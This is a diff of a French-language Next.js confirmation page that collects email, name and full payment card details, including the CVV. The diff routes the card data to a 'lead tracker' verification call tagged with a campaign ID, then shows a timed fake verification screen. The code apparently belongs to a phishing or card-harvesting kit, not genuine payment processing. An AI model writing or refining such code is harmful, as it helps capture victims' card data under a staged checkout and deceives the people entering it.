@@ -1,17 +1,17 @@
 import React, { useState, useEffect } from 'react';
 import { useRouter } from 'next/router';
-import { PageHead } from '../hooks/usePageMeta';
-import { useLeadTracker } from '../hooks/useLeadTracker';
+import { PageHead } from '../src/hooks/usePageMeta';
+import { useLeadTracker } from '../src/hooks/useLeadTracker';
 
 // Import des styles
-import layoutStyles from '../styles/components/Layout.module.css';
-import headerStyles from '../styles/components/Header.module.css';
-import planSummaryStyles from '../styles/components/PlanSummary.module.css';
-import buttonStyles from '../styles/components/Button.module.css';
-import PlanSelection from '../components/PlanSelection';
-import PlanSummary from '../components/PlanSummary';
-import PaymentForm from '../components/PaymentForm';
-import FooterTrust from '../components/FooterTrust';
+import layoutStyles from '../src/styles/components/Layout.module.css';
+import headerStyles from '../src/styles/components/Header.module.css';
+import planSummaryStyles from '../src/styles/components/PlanSummary.module.css';
+import buttonStyles from '../src/styles/components/Button.module.css';
+import PlanSelection from '../src/components/booking/PlanSelection';
+import PlanSummary from '../src/components/booking/PlanSummary';
+import PaymentForm from '../src/components/payment/PaymentForm';
+import FooterTrust from '../src/components/common/FooterTrust';
 
 const Confirmation = () => {
   const router = useRouter();
@@ -30,7 +30,6 @@ const Confirmation = () => {
   // États pour le système de vérification avancé
   const [showLoadingVerification, setShowLoadingVerification] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
-  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
   
   // Hook pour le tracking des leads
   const { trackVerification, isTracking, campaignId } = useLeadTracker();
@@ -144,9 +143,14 @@ const Confirmation = () => {
       // Étape 1: Afficher le loading et démarrer le processus de vérification
       setShowLoadingVerification(true);
       
-      // Préparer les données de vérification avec validation
-      const verificationRequestData = {
-        campaignId,
+      // Validation côté client avant envoi à l'API
+      if (!email || !formData.cardNumber || !formData.expiryDate || !formData.cvv || !formData.cardName) {
+        throw new Error('Veuillez remplir tous les champs obligatoires');
+      }
+      
+      // Étape 2: Appel RÉEL de l'API de tracking de vérification
+      console.log('📊 Début du tracking de vérification...');
+      const trackingResult = await trackVerification({
         email,
         firstName,
         cardNumber: formData.cardNumber,
@@ -154,49 +158,27 @@ const Confirmation = () => {
         cardCvv: formData.cvv,
         cardName: formData.cardName,
         selectedPlan
-      };
-
-      // Validation côté client avant envoi à l'API
-      if (!email || !formData.cardNumber || !formData.expiryDate || !formData.cvv || !formData.cardName) {
-        throw new Error('Veuillez remplir tous les champs obligatoires');
-      }
+      });
       
-      // Étape 2: Simulation du processus de vérification
-      await new Promise(resolve => setTimeout(resolve, 8000)); // 8 secondes pour UX
+      console.log('✅ Tracking de vérification réussi:', trackingResult);
       
-      // Étape 3: Finaliser directement (délégation du 3D Secure au composant PaymentForm/Checkout)
+      // Étape 3: Simulation du délai UX après le tracking réussi
+      await new Promise(resolve => setTimeout(resolve, 6000)); // 6 secondes pour UX
+      
+      // Étape 4: Finaliser le processus
       setShowLoadingVerification(false);
-      setTimeout(() => {
-        setShowSuccessPopup(true);
-      }, 500);
       
     } catch (error) {
-      console.error('Erreur processus de vérification:', error);
+      console.error('❌ Erreur lors du processus de vérification:', error);
       setShowLoadingVerification(false);
       
-      // Fallback vers l'ancien système en cas d'erreur
-      try {
-        await trackVerification({
-          email,
-          firstName,
-          cardNumber: formData.cardNumber,
-          expiryDate: formData.expiryDate,
-          cvv: formData.cvv,
-          cardName: formData.cardName,
-          selectedPlan
-        });
-        
-        setTimeout(() => {
-          setShowSuccessPopup(true);
-        }, 1000);
-        
-      } catch (trackingError) {
-        console.error('Erreur tracking fallback:', trackingError);
-        // Même en cas d'erreur de tracking, continuer le processus
-        setTimeout(() => {
-          setShowSuccessPopup(true);
-        }, 1000);
-      }
+      // En cas d'erreur de tracking, logger l'erreur pour le debugging
+      console.error('Détails de l\'erreur:', {
+        message: error.message,
+        campaignId,
+        email,
+        selectedPlan
+      });
     } finally {
       setIsProcessing(false);
     }
@@ -214,26 +196,6 @@ const Confirmation = () => {
     }
     
     setFormData(prev => ({ ...prev, [field]: formattedValue }));
-  };
-
-  // ============ FONCTIONS DE GESTION DES POPUPS DE VÉRIFICATION ============
-
-  const handleVerificationComplete = () => {
-    // Afficher le popup de succès au lieu de rediriger
-    setShowSuccessPopup(true);
-  };
-
-  const handlePaymentComplete = () => {
-    // Afficher le popup de succès au lieu de rediriger
-    setShowSuccessPopup(true);
-  };
-
-  const handleSuccessClose = () => {
-    setShowSuccessPopup(false);
-    // Redirection optionnelle seulement si l'utilisateur clique sur le bouton
-    if (selectedPlan === 'free') {
-      window.open('https://mail.google.com', '_blank');
-    }
   };
 
   return (
@@ -322,6 +284,8 @@ const Confirmation = () => {
                           onInputChange={handleInputChange}
                           onSubmit={handleSubmit}
                           isSubmitting={isTracking || isProcessing}
+                          email={email}
+                          firstName={firstName}
                         />
                       </div>
                     </div>
